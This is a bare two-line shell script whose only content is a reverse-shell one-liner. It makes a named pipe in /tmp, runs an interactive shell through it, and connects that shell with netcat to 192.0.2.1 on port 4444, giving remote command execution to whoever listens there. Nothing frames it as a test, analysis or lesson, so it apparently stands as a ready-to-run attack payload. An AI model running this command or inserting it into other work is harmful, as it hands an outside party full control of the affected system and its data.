#!/bin/sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.0.2.1 4444 > /tmp/f
